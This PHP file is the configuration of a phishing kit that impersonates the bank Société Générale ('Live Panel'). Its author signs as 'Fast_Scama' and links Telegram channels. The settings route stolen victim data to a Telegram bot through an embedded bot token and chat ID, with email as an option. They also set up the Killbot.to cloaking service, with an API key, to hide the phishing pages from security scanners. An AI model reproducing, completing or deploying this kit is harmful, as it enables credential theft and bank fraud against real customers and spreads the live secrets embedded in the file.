<?php
//▀███▀▀▀███                ██       ▄█▀▀▀█▄█
//  ██    ▀█                ██      ▄██    ▀█
//  ██   █  ▄█▀██▄  ▄██▀████████    ▀███▄    ▄██▀██ ▄█▀██▄ ▀████████▄█████▄  ▄█▀██▄
//  ██▀▀██ ██   ██  ██   ▀▀ ██        ▀█████▄█▀  ████   ██   ██    ██    ██ ██   ██
//  ▓█   █  ▄███▓█  ▀█████▄ ██            ▀██▓      ▄███▓█   ▓█    ██    ██  ▄███▓█
//  ▓█     █▓   ▓█       ██ █▓      ██     ██▓▄    ▄▓   ▓█   ▓█    ▓█    ██ █▓   ▓█
//  ▓▓      ▓▓▓▓▒▓  ▀▓   █▓ ▓▓      ▓     ▀█▓▓      ▓▓▓▓▒▓   ▓▓    ▓▓    ▓▓  ▓▓▓▓▒▓

//  Author: <Fast_Scama>   
//  Date Création : 10-03-2024
//  Description : Société Générale | Live Panel 

//  Canal télégram : https://t.me/fastscama
//  Mon Profil télégram : https://t.me/fast_scama

$mail_sending = false;          /*    Recevoir rez par email (ATTENTION PAS TOUS LES VPS ONT LE PORT D'OUVERT)*/
$rezmail = '';                  /* Configurations de ton mail ci-dessous */
$telegram_sending = true;      
                                                    
$bot_token = "6324463329:AAHFN-DaCpL2y3zZNjGEsno9kpdg-qTDbBE";                    /* TOKEN BOT */  
$chat_login = "-4080771206";                                                          

//$bot_token = "6324463329:AAHFN-DaCpL2y3zZNjGEsno9kpdg-qTDbBE";                    /* TOKEN BOT */  
//$chat_login = "-4039379914";                                                          


/*  Paramètres de tes clés Killbot.to     */

/* si tu n'as pas de clés Killbot.to, inscrit toi ici : https://killbot.to/r/pablorez            */
/* N'oublie pas de tout bien configuré sur le Panel Killbot.to pour ne pas avoir de page Error 500 ou autre galere.           */

$killBotApiKey = "a3bbaf5f-0916-42aa-9e09-ccbaf553cdc5";        /* Ta clé API Killbot.to */ 
$killBotConfigName = "default";                                 /* Nom de ta config */ 


?>